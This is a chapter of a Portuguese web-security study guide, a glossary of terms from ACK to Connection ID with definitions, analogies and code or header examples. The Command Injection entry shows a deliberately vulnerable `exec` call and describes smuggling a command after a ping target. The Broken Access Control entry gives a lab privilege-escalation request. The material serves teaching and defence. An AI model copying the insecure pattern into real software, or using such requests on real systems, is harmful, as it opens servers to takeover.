> [⬅️ 6 e 7. Checklist de Auditoria e Comparativo](./06-checklist-e-comparativo.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [9 e 10. Simulado (65 Questões) e Referências ➡️](./08-simulado-e-referencias.md)

---

<a id="s8"></a>
## 8. Glossário Técnico (A–Z)

Este glossário reúne, em ordem alfabética rigorosa, os conceitos fundamentais de **Desenvolvimento Web**, **Chrome DevTools**, **Segurança da Informação (Cybersecurity)** e **Redes de Computadores** abordados ao longo deste guia. Cada verbete foi estruturado em quatro dimensões complementares — **Nome**, **Significado** (definição formal e normativa), **Explicação simples** (analogia e intuição didática para fixação rápida em provas) e **Exemplo de utilização** (código, cabeçalho HTTP, comando de diagnóstico ou cenário de auditoria) — permitindo tanto a revisão de véspera quanto a consulta aprofundada com referências cruzadas para as demais seções da apostila.

> [!TIP]
> **Como usar este glossário na revisão para a prova:** Ao estudar um termo técnico, compare sempre o campo **Significado** (que traz os termos exatos cobrados em enunciados acadêmicos e bancas de concurso, incluindo números de RFC — *Request for Comments* — e categorias CWE/OWASP) com o campo **Explicação simples** (que evita confundir siglas parecidas como **CORS**, **COOP**, **COEP** e **CORP**, ou **XSS**, **CSRF** e **SSRF**).

---

<a id="s8-a"></a>
### 8.1 Letra A

##### ACK (Acknowledgment)
- **Nome**: ACK (*Acknowledgment* — Confirmação de Recebimento).
- **Significado**: Flag de controle de 1 bit presente no cabeçalho do protocolo TCP (*Transmission Control Protocol* — RFC 9293) que indica que o campo *Acknowledgment Number* (número de confirmação de 32 bits) do segmento é válido. Esse campo informa ao remetente qual é o próximo byte em sequência que o receptor espera receber, confirmando cumulativamente a entrega bem-sucedida de todos os bytes anteriores (veja [Redes de Computadores](./04-redes-de-computadores.md#s4)).
- **Explicação simples**: Funciona como o aviso de "recebido e lido" em uma conversa: quando você recebe a página 1 de um documento, responde ao remetente dizendo "Recebi tudo até o fim da página 1; pode me mandar a partir da página 2".
- **Exemplo de utilização**: No segundo e no terceiro passos do *Three-Way Handshake* TCP (`SYN` $\rightarrow$ `SYN, ACK` $\rightarrow$ `ACK`), inspecionados com `tcpdump`:
  ```text
  IP 192.0.2.10.54321 > 203.0.113.50.443: Flags [S], seq 1000, win 64240
  IP 203.0.113.50.443 > 192.0.2.10.54321: Flags [S.], seq 5000, ack 1001, win 65535
  IP 192.0.2.10.54321 > 203.0.113.50.443: Flags [.], ack 5001, win 502
  ```

##### AEAD (Authenticated Encryption with Associated Data)
- **Nome**: AEAD (*Authenticated Encryption with Associated Data* — Criptografia Autenticada com Dados Associados).
- **Significado**: Classe de algoritmos criptográficos simétricos (RFC 5116) que garante simultaneamente a **confidencialidade** (cifragem do texto em claro) e a **integridade/autenticidade** (geração de uma *tag* de autenticação criptográfica ou MAC — *Message Authentication Code*) em uma única construção integrada, permitindo ainda autenticar metadados em texto claro (como cabeçalhos de registro TLS ou pacotes QUIC). No TLS 1.3 (RFC 8446), o uso de cifras AEAD (como `AES-128-GCM`, `AES-256-GCM` e `ChaCha20-Poly1305`) é **[REQUISITO]** obrigatório, eliminando cifras legadas em modo CBC (*Cipher Block Chaining*) vulneráveis a ataques de *padding oracle*.
- **Explicação simples**: É um cofre blindado com lacre antifraude integrado: além de esconder o conteúdo da mensagem contra curiosos (confidencialidade), qualquer tentativa de alterar um único bit do envelope ou da mensagem faz o lacre romper imediatamente na abertura (integridade).
- **Exemplo de utilização**: Inspecionando a suíte de cifras negociada pelo navegador na conexão HTTPS (`TLS_AES_128_GCM_SHA256`):
  ```bash
  openssl s_client -connect api.exemplo.test:443 -tls1_3
  # Protocol  : TLSv1.3
  # Cipher    : TLS_AES_128_GCM_SHA256
  ```

##### API (Application Programming Interface)
- **Nome**: API (*Application Programming Interface* — Interface de Programação de Aplicações).
- **Significado**: Conjunto formal de contratos, rotinas, estruturas de dados, endpoints e protocolos que define como componentes de software distintos se comunicam entre si. No contexto web, refere-se tanto às **Web APIs do navegador** (como DOM, `fetch()`, `localStorage` e `IndexedDB`, expostas ao JavaScript) quanto às **APIs de back-end** (tipicamente arquitetadas em REST sobre HTTPS trocando payloads JSON — veja [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1)).
- **Explicação simples**: É o cardápio e o garçom de um restaurante: o cliente (front-end) não entra na cozinha (banco de dados/servidor); ele faz o pedido seguindo as opções padronizadas do cardápio (API) e recebe o prato pronto.
- **Exemplo de utilização**: Chamada a uma API REST a partir do navegador utilizando `fetch()`:
  ```javascript
  const resposta = await fetch('https://api.exemplo.test/v1/pedidos/42', {
    method: 'GET',
    headers: { 'Accept': 'application/json' },
    credentials: 'include'
  });
  const dados = await resposta.json();
  ```

##### ARP (Address Resolution Protocol)
- **Nome**: ARP (*Address Resolution Protocol* — Protocolo de Resolução de Endereços).
- **Significado**: Protocolo operando na transição entre a Camada de Rede (Camada 3) e a Camada de Enlace (Camada 2) do modelo OSI (RFC 826) responsável por descobrir dinamicamente o endereço físico **MAC** (*Media Access Control*, de 48 bits) associado a um determinado endereço lógico **IPv4** (de 32 bits) dentro de um mesmo domínio de broadcast local (LAN). Por não possuir autenticação nativa, é suscetível a ataques de *ARP Spoofing / ARP Poisoning*. No IPv6, o ARP foi substituído pelo **NDP** (*Neighbor Discovery Protocol*, RFC 4861) sobre ICMPv6.
- **Explicação simples**: É como gritar em uma sala cheia: "Quem aqui é o dono do IP `192.168.1.1`?" (broadcast ARP Request), para que o roteador levante a mão e responda diretamente: "Sou eu, meu endereço físico na placa de rede é `aa:bb:cc:11:22:33`" (unicast ARP Reply).
- **Exemplo de utilização**: Consulta à tabela de cache ARP local do sistema operacional:
  ```bash
  arp -a
  # Interface: 192.168.1.50 --- 0x4
  #   Endereço IP           Endereço Físico       Tipo
  #   192.168.1.1           00-1a-2b-3c-4d-5e     dinâmico
  ```

##### ASVS (Application Security Verification Standard)
- **Nome**: OWASP ASVS (*Application Security Verification Standard* — Padrão de Verificação de Segurança de Aplicações).
- **Significado**: Framework aberto mantido pela OWASP que estabelece uma lista estruturada de requisitos e controles de segurança arquiteturais e de codificação para projetar, desenvolver e auditar aplicações web e APIs. Divide-se em três níveis de rigor crescente: **Nível 1** (básico, verificável por testes de penetração/caixa-preta), **Nível 2** (padrão recomendado para a maioria das aplicações que lidam com dados sensíveis) e **Nível 3** (crítico, para aplicações financeiras, médicas ou militares de alto risco).
- **Explicação simples**: Enquanto o OWASP Top 10 é um cartaz com os "10 problemas mais comuns", o ASVS é o manual completo de engenharia e inspeção predial usado para construir e certificar um sistema seguro do zero.
- **Exemplo de utilização**: Requisito de verificação de sessão do ASVS v4.0 (Seção V3.2) aplicado em uma auditoria de código:
  ```text
  [ASVS V3.2.1] Verificar se a aplicação gera um novo token de sessão
  com alta entropia a cada autenticação bem-sucedida (prevenindo Session Fixation).
  ```

##### Autenticação (Authentication / AuthN)
- **Nome**: Autenticação (*Authentication*, frequentemente abreviada como **AuthN**).
- **Significado**: Processo de verificação criptográfica ou lógica da identidade declarada por uma entidade (usuário humano, dispositivo ou serviço), comprovando que ela é realmente quem afirma ser por meio de um ou mais fatores de autenticação: algo que você **sabe** (senha, PIN), algo que você **tem** (token físico, chave FIDO2/WebAuthn, aplicativo TOTP — *Time-based One-Time Password*) ou algo que você **é** (biometria). Falhas na sua verificação resultam tipicamente no código HTTP `401 Unauthorized` (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)).
- **Explicação simples**: É apresentar seu documento de identidade com foto na recepção de um prédio comercial para provar quem você é antes de receber o crachá de visitante.
- **Exemplo de utilização**: Requisição de autenticação enviando credenciais em HTTPS via método `POST` e recebendo um cookie de sessão seguro:
  ```http
  POST /api/v1/auth/login HTTP/1.1
  Host: loja-ficticia.test
  Content-Type: application/json

  {"email": "aluno@exemplo.test", "senha": "SenhaForte!2026","totp": "482910"}
  ```

##### Autorização (Authorization / AuthZ)
- **Nome**: Autorização (*Authorization*, frequentemente abreviada como **AuthZ**).
- **Significado**: Processo de controle de acesso executado **após** a autenticação que determina se uma identidade já identificada possui permissão explícita para executar uma determinada ação (leitura, criação, edição, exclusão) ou acessar um recurso específico (funcionalidade ou registro de dados). Pode basear-se em papéis (**RBAC** — *Role-Based Access Control*) ou atributos/propriedade do objeto (**ABAC** — *Attribute-Based Access Control*). Quando a identidade é conhecida mas não tem permissão, o servidor retorna `403 Forbidden`.
- **Explicação simples**: Depois que a recepção já sabe quem você é (autenticação), a autorização é a regra na catraca que define que o seu crachá abre a porta do 2º andar (sala de reuniões), mas bloqueia a sua entrada no 10º andar (datacenter restrito).
- **Exemplo de utilização**: Verificação de autorização no nível do objeto (prevenindo BOLA/IDOR) no back-end antes de retornar um pedido:
  ```javascript
  if (pedido.usuarioId !== req.usuarioAutenticado.id && req.usuarioAutenticado.role !== 'admin') {
    return res.status(403).json({ erro: 'Acesso negado a este recurso.' });
  }
  ```

---

<a id="s8-b"></a>
### 8.2 Letra B

##### Base64 / Base64URL
- **Nome**: Base64 e Base64URL (*Base 64 Encoding with URL and Filename Safe Alphabet* — RFC 4648).
- **Significado**: Esquema de **codificação** (*encoding*) reversível que converte dados binários arbitrários (sequências de bytes) em uma representação textual composta exclusivamente por 64 caracteres ASCII seguros para transporte. Enquanto o Base64 padrão utiliza `A-Z`, `a-z`, `0-9`, `+`, `/` e `=` (preenchimento/*padding*), a variante **Base64URL** substitui `+` por `-` (hífen), `/` por `_` (*underscore*) e frequentemente omite o `=`, permitindo que o resultado seja incluído diretamente em URLs, nomes de arquivos e tokens JWT sem quebrar a sintaxe HTTP. **Não é criptografia**: qualquer pessoa pode decodificá-lo instantaneamente sem chave.
- **Explicação simples**: É como traduzir um texto do português para o código Morse: qualquer pessoa na sala que conheça a tabela Morse consegue ler a mensagem imediatamente; serve apenas para transportar dados por canais que só aceitam texto simples, nunca para esconder segredos.
- **Exemplo de utilização**: Decodificando o payload Base64URL de um token JWT diretamente na aba [Console](./02c-devtools-console.md#s2-3) do Chrome DevTools:
  ```javascript
  const payloadBase64Url = "eyJzdWIiOiIxMjM0NSIsInJvbGUiOiJ1c2VyIn0";
  const jsonDecodificado = atob(payloadBase64Url.replace(/-/g, '+').replace(/_/g, '/'));
  console.log(JSON.parse(jsonDecodificado)); // { sub: "12345", role: "user" }
  ```

##### bfcache (Back/Forward Cache)
- **Nome**: bfcache (*Back/Forward Cache* — Cache de Navegação Voltar/Avançar).
- **Significado**: Otimização interna dos navegadores modernos que mantém em memória um *snapshot* completo e congelado da página inteira (incluindo a árvore DOM, o estado do heap JavaScript e o layout renderizado) quando o usuário navega para outra página, permitindo restauração instantânea ao acionar os botões **Voltar** ou **Avançar** do navegador sem emitir nova requisição de rede. Do ponto de vista de segurança, páginas autenticadas com dados sensíveis devem enviar `Cache-Control: no-store` para evitar que informações confidenciais sejam restauradas na tela após o logout em computadores compartilhados (veja a seção [Application](./02b-devtools-application.md#s2-2)).
- **Explicação simples**: Em vez de fechar um livro e guardá-lo na estante a cada vez que você olha outra folha, o navegador apenas coloca um marcador de página e deixa o livro aberto na mesa, pronto para você voltar exatamente ao ponto em que parou em zero segundo.
- **Exemplo de utilização**: No Chrome DevTools, abra **Application > Background services > Back/forward cache** e clique em **Test back/forward cache** para verificar se a página atual é elegível ou bloqueada por `Cache-Control: no-store`.

##### Bcrypt (e Argon2id)
- **Nome**: Bcrypt e Argon2id (Funções de Derivação de Chave e Hashing de Senhas).
- **Significado**: Algoritmos criptográficos projetados especificamente para o armazenamento seguro de senhas (*password hashing*) no banco de dados. Diferentemente de funções de hash rápidas de propósito geral (como MD5, SHA-1 ou SHA-256 puro, que permitem bilhões de tentativas por segundo em GPUs modernas), o **bcrypt** (baseado na cifra Blowfish, com fator de custo configurável) e o **Argon2id** (vencedor da *Password Hashing Competition*, RFC 9106, resistente tanto a ataques de GPU quanto a ataques de canal lateral) incorporam um **salt** aleatório único por senha e são propositalmente lentos e intensivos em CPU e memória (*memory-hard*).
- **Explicação simples**: É uma fechadura com mecanismo de retardo hidráulico: para o usuário legítimo que abre a porta uma vez no login, esperar 0,2 segundo é imperceptível; mas para um invasor tentando testar 10 milhões de chaves roubadas, esse atraso transforma um ataque de minutos em séculos.
- **Exemplo de utilização**: Estrutura de um hash bcrypt armazenado no banco de dados (contendo versão `$2b$`, custo `12`, salt de 128 bits e hash concatenados):
  ```text
  $2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
  ```

##### BOM (Browser Object Model)
- **Nome**: BOM (*Browser Object Model* — Modelo de Objetos do Navegador).
- **Significado**: Conjunto de objetos e interfaces expostos pelo navegador ao ambiente JavaScript fora do documento HTML propriamente dito, tendo o objeto global `window` como raiz e englobando `window.location` (URL atual e redirecionamento), `window.history` (histórico da sessão), `window.navigator` (informações do agente de usuário e permissões de hardware), `window.screen`, `window.localStorage`, `window.sessionStorage` e o método de comunicação entre janelas `window.postMessage()`. Propriedades do BOM como `location.search` e `location.hash` atuam frequentemente como **fontes (*sources*)** não confiáveis em vulnerabilidades de **DOM-Based XSS**.
- **Explicação simples**: Se o DOM é o papel timbrado com o texto dentro da moldura, o BOM é a própria janela do navegador ao redor dele: a barra de endereços, os botões de voltar/avançar e as abas abertas.
- **Exemplo de utilização**: Leitura segura de parâmetros de consulta a partir do objeto `window.location` no BOM:
  ```javascript
  const params = new URLSearchParams(window.location.search);
  const termo = params.get('q') ?? '';
  document.getElementById('resultado').textContent = `Busca por: ${termo}`;
  ```

##### Broken Access Control (Quebra de Controle de Acesso)
- **Nome**: Broken Access Control (Quebra de Controle de Acesso — OWASP Top 10 A01).
- **Significado**: Categoria de vulnerabilidade crítica (líder do OWASP Top 10 em 2021 e 2025) na qual a aplicação falha em impor restrições adequadas sobre o que usuários autenticados ou anônimos estão autorizados a fazer. Inclui elevação de privilégio **vertical** (um usuário comum acessando rotas administrativas como `/admin/usuarios`) e **horizontal** (um usuário acessando ou modificando dados pertencentes a outro usuário de mesmo nível, como em falhas de IDOR/BOLA), além do contorno de verificações feitas apenas no front-end (ocultar botões via CSS/JS sem validar permissões no servidor).
- **Explicação simples**: É um prédio onde todas as portas internas estão destrancadas e a única "proteção" da sala do cofre é que o botão do 12º andar foi escondido no painel do elevador — qualquer pessoa que suba pela escada entra livremente.
- **Exemplo de utilização**: Requisição maliciosa em ambiente de laboratório alterando o papel do próprio perfil por falta de controle de acesso no endpoint de atualização:
  ```http
  PATCH /api/v1/meu-perfil HTTP/1.1
  Host: loja-ficticia.test
  Content-Type: application/json

  {"nome": "João", "isAdmin": true}
  ```

##### Brute Force (Ataque de Força Bruta)
- **Nome**: Brute Force Attack (Ataque de Força Bruta e variantes *Credential Stuffing* / *Password Spraying*).
- **Significado**: Método automatizado de tentativa e erro no qual um atacante submete sistematicamente combinações de senhas, códigos de verificação (OTP), PINs, chaves criptográficas ou nomes de diretórios até encontrar o valor válido. Suas variantes modernas incluem o **Credential Stuffing** (testar pares de `e-mail:senha` vazados de outros serviços aproveitando a reutilização de senhas) e o **Password Spraying** (testar uma única senha comum, como `Mudar@123`, contra milhares de contas diferentes para evitar o bloqueio individual de conta).
- **Explicação simples**: É tentar abrir um cadeado de mala de 4 dígitos testando `0000`, `0001`, `0002` até `9999` sem parar.
- **Exemplo de utilização**: Na aba [Network](./02a-devtools-network.md#s2-1), uma sequência rápida de dezenas de requisições `POST /login` retornando `401 Unauthorized` sem que o servidor passe a responder `429 Too Many Requests` evidencia ausência de proteção contra força bruta.

---

<a id="s8-c"></a>
### 8.3 Letra C

##### CA (Certificate Authority)
- **Nome**: CA (*Certificate Authority* — Autoridade Certificadora).
- **Significado**: Entidade confiável (pública, como Let's Encrypt, DigiCert e GlobalSign, ou corporativa interna) responsável por validar a titularidade de um domínio ou organização e emitir certificados digitais **X.509** assinados criptograficamente com sua chave privada. Os navegadores e sistemas operacionais mantêm uma lista pré-instalada de **Root CAs** (Autoridades Raiz) em seu repositório de confiança (*Trust Store*), que validam **Intermediate CAs** (Intermediárias), as quais por sua vez assinam o certificado final do servidor web (*Leaf Certificate*), formando a **Cadeia de Confiança** (*Chain of Trust*) do HTTPS.
- **Explicação simples**: É o cartório oficial da Internet: o navegador não conhece o site `loja-ficticia.test` pessoalmente, mas confia na assinatura e no selo digital do cartório (CA) que verificou os documentos do dono daquele domínio.
- **Exemplo de utilização**: Na aba **Security** (ou clicando no ícone de ajuste/cadeado na barra de endereços do Chrome > **Connection is secure > Certificate is valid**), visualiza-se a hierarquia completa: `ISRG Root X1 -> R10 -> loja-ficticia.test`.

##### Cache-Control
- **Nome**: `Cache-Control` (Cabeçalho HTTP de Controle de Cache — RFC 9111).
- **Significado**: Header HTTP presente tanto em requisições quanto em respostas que especifica diretivas para todos os mecanismos de cache ao longo da cadeia de comunicação (cache privado do navegador e caches compartilhados como CDNs e proxies). Diretivas críticas para segurança e performance incluem `no-store` (proíbe gravar qualquer cópia da resposta em disco ou memória — **[REQUISITO]** para respostas com dados sensíveis/autenticados), `no-cache` (permite armazenar, mas exige revalidação no servidor antes de reutilizar), `private` (apenas o navegador do usuário final pode cachear, nunca CDNs), `public`, `max-age=<segundos>` e `immutable` (veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)).
- **Explicação simples**: É a etiqueta de conservação colada na embalagem do produto: ela diz se o item pode ficar guardado na despensa do condomínio para todo mundo usar (`public`), só na geladeira da sua casa (`private`), ou se deve ser consumido na hora e nunca guardado (`no-store`).
- **Exemplo de utilização**: Configuração de resposta HTTP protegendo um endpoint bancário contra armazenamento em cache:
  ```http
  HTTP/1.1 200 OK
  Content-Type: application/json; charset=utf-8
  Cache-Control: no-store, no-cache, must-revalidate, private
  Pragma: no-cache
  ```

##### Cache Poisoning (Web Cache Poisoning e Web Cache Deception)
- **Nome**: Web Cache Poisoning (Envenenamento de Cache Web) e Web Cache Deception (Decepção de Cache Web).
- **Significado**: Duas classes distintas de ataques contra caches compartilhados (CDNs e proxies reversos):
  1. No **Web Cache Poisoning**, o atacante envia uma requisição HTTP contendo um parâmetro não incluído na chave de cache (*unkeyed input*, como headers `X-Forwarded-Host` ou `X-Original-URL`) que induz o servidor a gerar uma resposta maliciosa (ex.: contendo XSS), a qual é armazenada pela CDN e servida para todos os demais usuários legítimos.
  2. No **Web Cache Deception**, o atacante induz uma vítima autenticada a acessar uma URL como `https://banco.exemplo.test/minha-conta/extrato/estilo.css`; se o servidor de origem ignorar o sufixo `.css` e retornar os dados privados do extrato com status `200`, a CDN pode armazená-lo como arquivo estático público, permitindo que o atacante leia o extrato da vítima em seguida.
- **Explicação simples**: *Cache Poisoning* é contaminar a caixa-d'água central do prédio para que todos os moradores recebam água suja na torneira; *Cache Deception* é enganar o porteiro para que ele tire uma cópia da sua carta bancária confidencial e a pregue no mural público do hall porque o envelope tinha um adesivo escrito "Jornal Grátis (.css)".
- **Exemplo de utilização**: Verificação na aba [Network](./02a-devtools-network.md#s2-1) do cabeçalho `CF-Cache-Status: HIT` ou `X-Cache: HIT` em uma rota de API autenticada (`/api/perfil`), indicando falha grave de cacheamento público de dados privados.

##### CDN (Content Delivery Network)
- **Nome**: CDN (*Content Delivery Network* — Rede de Distribuição de Conteúdo).
- **Significado**: Infraestrutura geograficamente distribuída de servidores de borda (*edge servers* / PoPs — *Points of Presence*) posicionados estrategicamente próximos aos usuários finais que atuam como proxies reversos e caches distribuídos. A CDN reduz a latência (menor **TTFB** e menor distância física de propagação TCP/TLS), absorve picos de tráfego, aplica mitigação de ataques DDoS (*Distributed Denial of Service*) e frequentemente hospeda um **WAF** (*Web Application Firewall*) antes que a requisição chegue ao servidor de origem (*origin server*).
- **Explicação simples**: Em vez de todas as livrarias do país encomendar cada livro diretamente da gráfica central em outro continente, a editora espalha centros de distribuição regionais em cada capital com os livros mais pedidos já em estoque.
- **Exemplo de utilização**: Carregamento de biblioteca externa a partir de uma CDN pública utilizando obrigatoriamente **SRI** (*Subresource Integrity*) para proteção contra comprometimento da CDN:
  ```html
  <script src="https://cdn.exemplo.test/lib/dompurify-3.1.6.min.js"
          integrity="sha384-v8A1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d1"
          crossorigin="anonymous"></script>
  ```

##### CHIPS (Cookies Having Independent Partitioned State)
- **Nome**: CHIPS (*Cookies Having Independent Partitioned State* — Atributo `Partitioned`).
- **Significado**: Mecanismo de privacidade de padrões web suportado pelo Chrome que permite que um cookie de terceiro (`SameSite=None; Secure`) seja armazenado em um pote de cookies isolado (*partitioned jar*) vinculado simultaneamente ao domínio do recurso incorporado (o terceiro) e ao site de nível superior (*top-level site* / *Partition Key*). Isso impede que um mesmo cookie de terceiro rastreie o usuário através de diferentes sites da web (*cross-site tracking*), mantendo casos de uso legítimos como widgets de chat, mapas autenticados ou iframes de pagamento por domínio.
- **Explicação simples**: Em vez de um prestador de serviço ter um único crachá universal que permite saber por quais prédios da cidade você passou hoje, cada prédio emite um crachá separado daquele prestador que só funciona dentro daquele edifício específico.
- **Exemplo de utilização**: Definição de um cookie particionado no header `Set-Cookie` (visível nas colunas `Partitioned` e `Partition Key` da aba [Application > Cookies](./02b-devtools-application.md#s2-2)):
  ```http
  Set-Cookie: __Host-widget_sess=abc987; Secure; HttpOnly; Path=/; SameSite=None; Partitioned
  ```

##### CIDR (Classless Inter-Domain Routing)
- **Nome**: CIDR (*Classless Inter-Domain Routing* — Roteamento Entre Domínios Sem Classes — RFC 4632).
- **Significado**: Método de alocação de endereços IP e agregação de rotas que substituiu a antiga arquitetura rígida de classes (Classes A, B e C) por prefixos de comprimento variável (**VLSM** — *Variable Length Subnet Mask*). A notação CIDR acrescenta ao endereço IP uma barra seguida de um número decimal (`/n`, de `0` a `32` no IPv4 e de `0` a `128` no IPv6) que indica quantos bits iniciais (da esquerda para a direita) compõem o **identificador de rede**, restando os bits finais ($h = 32 - n$ no IPv4) para identificar os hosts dentro daquela sub-rede ($2^h - 2$ hosts utilizáveis).
- **Explicação simples**: Em vez de vender terrenos apenas em três tamanhos fixos (gigante, médio ou minúsculo), o CIDR permite cortar o quarteirão de endereços IP sob medida exata, indicando após a barra (`/24`, `/26`, `/30`) quantos dígitos do CEP pertencem ao bairro e quantos pertencem às casas.
- **Exemplo de utilização**: Bloco CIDR `192.168.10.0/26` possui máscara `255.255.255.192` ($32 - 26 = 6$ bits de host $\Rightarrow 2^6 - 2 = 62$ hosts úteis, de `192.168.10.1` a `192.168.10.62`, com broadcast em `192.168.10.63`).

##### Clickjacking (UI Redressing)
- **Nome**: Clickjacking (*UI Redressing* — Sequestro de Cliques / Redesenho de Interface — CWE-1021).
- **Significado**: Vulnerabilidade de interface na qual uma página maliciosa carrega uma aplicação web legítima dentro de um `<iframe>` transparente (`opacity: 0`) sobreposto exatamente a elementos visuais falsos (como um botão "Ganhe um Prêmio" ou um jogo). Quando a vítima clica no botão aparente da página maliciosa, seu clique real atinge o botão sensível invisível do site legítimo carregado no iframe (ex.: "Confirmar Transferência", "Excluir Conta" ou "Autorizar Aplicativo"), aproveitando a sessão ativa da vítima. A defesa primária é o envio da diretiva `Content-Security-Policy: frame-ancestors 'none'` (ou `'self'`) combinada com `X-Frame-Options: DENY` (ou `SAMEORIGIN`).
- **Explicação simples**: É colocar uma folha de papel carbono invisível com um contrato de venda de imóvel por cima de um cupom de sorteio: você acha que está assinando o cupom do sorteio, mas a pressão da caneta está assinando o contrato escondido logo abaixo.
- **Exemplo de utilização**: Cabeçalhos de resposta HTTP que bloqueiam o carregamento da página em qualquer `<frame>` ou `<iframe>` externo:
  ```http
  Content-Security-Policy: frame-ancestors 'none';
  X-Frame-Options: DENY
  ```

##### Cliente-Servidor (Arquitetura Cliente-Servidor)
- **Nome**: Arquitetura Cliente-Servidor (*Client-Server Model*).
- **Significado**: Modelo de computação distribuída em rede no qual as responsabilidades são divididas entre o **Cliente** (*User Agent* — navegador web, aplicativo móvel ou script CLI, que inicia requisições, renderiza interfaces e executa código não confiável no dispositivo do usuário) e o **Servidor** (sistema remoto que aguarda conexões, processa regras de negócio, aplica controles de autenticação/autorização e gerencia a persistência em bancos de dados). Na segurança web, é axioma fundamental que **o cliente está sob controle total do usuário/atacante**: toda validação realizada no cliente (HTML/JS) tem finalidade de usabilidade (UX), sendo **[REQUISITO]** revalidar todas as entradas e permissões no servidor.
- **Explicação simples**: O cliente é o comprador no balcão da loja fazendo pedidos; o servidor é o caixa e o estoque atrás do balcão blindado. O cliente pode escrever o preço que quiser em um papelzinho, mas é o servidor atrás do balcão quem confere o preço oficial no sistema antes de liberar a mercadoria.
- **Exemplo de utilização**: Mesmo que um campo `<input type="number" min="1" max="10">` restrinja a quantidade no navegador, o servidor deve validar `if (qtd < 1 || qtd > 10) return res.status(400)` porque o cliente pode enviar `"qtd": -50` via DevTools ou `curl`.

##### CNAME (Canonical Name Record)
- **Nome**: CNAME (*Canonical Name Record* — Registro de Nome Canônico no DNS — RFC 1035).
- **Significado**: Tipo de registro do sistema DNS que mapeia um nome de domínio (apelido ou *alias*, como `loja.exemplo.test`) para outro nome de domínio verdadeiro/canônico (como `loja-prod.provedor-nuvem.test`), em vez de apontar diretamente para um endereço IP. Um risco crítico de segurança associado ao CNAME é o **Subdomain Takeover** (Tomada de Subdomínio): quando um registro CNAME continua apontando para um serviço externo em nuvem (GitHub Pages, S3, Azure, Heroku) que foi desativado pela empresa, permitindo que um atacante registre aquele nome no provedor externo e passe a responder em nome do subdomínio oficial da organização.
- **Explicação simples**: É um aviso de "Mudou-se: procure por Fulano no endereço comercial da empresa X". Se a empresa X fechar a filial e você esquecer de tirar a placa, um golpista pode alugar aquela sala vazia no prédio comercial e receber todas as encomendas endereçadas ao seu subdomínio.
- **Exemplo de utilização**: Consulta DNS com `dig` revelando um encadeamento CNAME até o registro `A` final:
  ```bash
  dig www.exemplo.test
  # ;; ANSWER SECTION:
  # www.exemplo.test.    300  IN  CNAME  lb-global.cdn-ficticia.test.
  # lb-global.cdn-ficticia.test. 60 IN A 198.51.100.42
  ```

##### COEP (Cross-Origin-Embedder-Policy)
- **Nome**: COEP (*Cross-Origin-Embedder-Policy* — Política de Incorporação de Origem Cruzada).
- **Significado**: Header de segurança de resposta HTTP que controla se um documento pode carregar sub-recursos cross-origin (imagens, scripts, iframes, folhas de estilo) que não concedam permissão explícita para serem incorporados. Seus valores são `unsafe-none` (padrão), `require-corp` (exige que todo recurso cross-origin carregado possua cabeçalho `Cross-Origin-Resource-Policy` ou CORS válido) e `credentialless` (carrega recursos cross-origin sem enviar cookies/credenciais). Combinado com `Cross-Origin-Opener-Policy: same-origin` (COOP), ativa o estado de **Isolamento de Origem Cruzada** (`self.crossOriginIsolated === true`), exigido pelo navegador para liberar APIs de alta precisão temporal como `SharedArrayBuffer` e `performance.measureUserAgentSpecificMemory()` (mitigando ataques de canal lateral como *Spectre*).
- **Explicação simples**: É uma regra de condomínio de alta segurança que diz: "Nenhum pacote, móvel ou visitante externo entra neste prédio a menos que traga uma autorização formal assinada (CORP/CORS) ou entre sem nenhuma bolsa/documento da portaria (`credentialless`)".
- **Exemplo de utilização**: Verificação no [Console](./02c-devtools-console.md#s2-3) do DevTools se o documento atingiu o isolamento necessário com COOP + COEP:
  ```javascript
  console.log(self.crossOriginIsolated); // true quando COOP: same-origin e COEP: require-corp estão ativos
  ```

##### Command Injection (Injeção de Comandos do Sistema Operacional)
- **Nome**: OS Command Injection (Injeção de Comandos do Sistema Operacional — CWE-78).
- **Significado**: Vulnerabilidade crítica do lado do servidor na qual a aplicação concatena entradas fornecidas pelo usuário diretamente em uma string repassada a um interpretador de shell do sistema operacional (`sh`, `bash`, `cmd.exe`, `powershell.exe`) por meio de funções como `system()`, `exec()`, `popen()` ou `child_process.exec()`. Utilizando metacaracteres de encadeamento de comandos (`;`, `&&`, `||`, `|`, `` ` `` ou `$(...)`), o atacante consegue executar comandos arbitrários no servidor com os mesmos privilégios do processo da aplicação web (**RCE** — *Remote Code Execution*).
- **Explicação simples**: É pedir a um assistente que execute no terminal o comando "faça ping no endereço X", e um usuário mal-intencionado preencher o campo X com `8.8.8.8; e apague todos os arquivos da pasta`. Como o assistente lê a frase inteira sem separar o que é endereço do que é ordem nova, ele executa os dois comandos.
- **Exemplo de utilização**: Diferença entre código vulnerável (usando shell) e código seguro (usando array de argumentos sem shell no Node.js):
  ```javascript
  // INSEGURO: invoca /bin/sh e interpreta metacaracteres como ";" ou "&&"
  exec(`ping -c 1 ${req.query.host}`);

  // SEGURO [REQUISITO]: execFile não invoca shell e passa argumentos isolados
  execFile('/bin/ping', ['-c', '1', hostValidado], callback);
  ```

##### Connection ID
- **Nome**: Connection ID (Identificador de Conexão no Chrome DevTools e no protocolo QUIC).
- **Significado**:
  1. Na aba [Network](./02a-devtools-network.md#s2-1) do Chrome DevTools, é uma coluna da tabela de requisições que exibe um identificador numérico interno atribuído pelo navegador a cada soquete TCP ou sessão multiplexada subjacente, permitindo verificar se múltiplas requisições reutilizaram a mesma conexão persistente (`Keep-Alive` no HTTP/1.1 ou multiplexação de *streams* em uma única conexão `h2`/`h3`).
  2. No protocolo **QUIC / HTTP/3** (RFC 9000), o *Connection ID* é um identificador de nível de transporte independente da tupla `(IP de origem, Porta de origem, IP de destino, Porta de destino)`, permitindo que um smartphone mude do Wi-Fi para o 5G (mudando de endereço IP) sem derrubar a conexão HTTPS nem refazer o handshake TLS (*Connection Migration*).
- **Explicação simples**: É o número da linha telefônica usada na conversa: no DevTools, se 30 arquivos mostram o mesmo *Connection ID*, significa que o navegador não precisou discar 30 vezes para o servidor — mandou tudo pela mesma ligação já aberta.
